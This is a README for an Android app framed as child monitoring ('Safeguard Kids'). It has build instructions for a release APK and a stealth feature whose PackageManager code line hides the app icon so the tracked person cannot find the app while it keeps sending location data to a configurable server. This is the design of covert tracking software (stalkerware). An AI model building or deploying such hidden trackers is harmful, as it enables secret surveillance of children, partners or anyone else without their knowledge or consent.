# Safeguard Kids - Android Client

This directory contains the source code for the Android client application.

## Features
- **Stealth Mode**: The app hides its icon from the launcher after installation to prevent detection by the child.
- **Background Tracking**: Continuously sends location data to the backend server.
- **Optimized Size**: Configured to use R8/ProGuard for minimal APK size.

## Build Instructions

Since this is a React Native project with native modules, you need a full Android development environment.

### Prerequisites
- Node.js
- Android Studio & Android SDK
- Java JDK 11+

### Steps
1. **Install Dependencies**:
   ```bash
   npm install
   ```

2. **Configure Backend**:
   Edit `src/App.tsx` and replace `BACKEND_URL` with your server's IP address.

3. **Build APK (Release Mode)**:
   To generate a signed, compressed APK:
   ```bash
   cd android
   ./gradlew assembleRelease
   ```
   The APK will be located at `android/app/build/outputs/apk/release/app-release.apk`.

### How Stealth Mode Works
The `StealthModule.java` uses the Android `PackageManager` API to disable the `MainActivity` component.
```java
p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
```
This removes the icon from the app drawer but keeps the app installed and running. To open the app again, you would typically need a custom broadcast receiver or a dialer code (not implemented in this basic version).

### Compression
The `android/app/build.gradle` file is configured with:
- `minifyEnabled true`: Activates R8 code shrinking.
- `shrinkResources true`: Removes unused resources.
